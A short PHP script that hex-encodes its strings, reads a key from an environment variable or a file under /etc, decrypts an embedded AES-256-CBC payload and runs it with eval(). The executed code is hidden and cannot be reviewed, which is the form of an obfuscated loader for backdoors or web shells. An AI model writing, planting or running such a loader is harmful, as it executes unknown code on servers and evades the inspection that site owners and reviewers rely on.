<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('21QS/h1C9pyljlpD4Sms9A==');

$c=base64_decode(

'nhHsh/IfN8Y6RmYsq1Nh8j1ZXbyXmIht26FJK7LLU40phJnHWeMhTcqqPwjUQegfXbLgr16kBDRg' .
'AEXEois3jOj2Qh2yZSQS/s2LxJeLWVkYG+ZlbAXeFlL1RT71aHNK7kHxrGITC32P4fcIU8N4VeSQ' .
'XRjmjt+MQr+TgV6qfd6rkWY06mTme9BqLVmm+KcZ1oDjkIV4cjTgH5ysbwBhY/OY2TO9mIVlGHCe' .
'l/1R9RwuB/E3BdKzOG+xbZLrE6T4w0E/pqKo5qrWH9wxl0WNdzLWbehbkx1OIH5SM7dGH4NpVvFr' .
'BhZU9pasvIJq+ayfGCSP1ptZLrsDzYEzyKv3+TuiDoBXaok0u5EaHo4ACyH+6cJxNlCTMrsB2ws/' .
'jMOkHd6Q1HS5/zAk8hqynZuE5vgYusd+FEd/SFmCVXQQ56bQLWJEHAMye6MylVrPpnCswlowZPRU' .
'A/qk5JeRJLqaK5p/CwPWSzJHN2wKkFm6hWBXxfI4NQ/rf6QL3natwPVSRp9JXBIADg9qHyUEhEqZ' .
'7w6CygaGEJcysXLI8bHz+ys='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

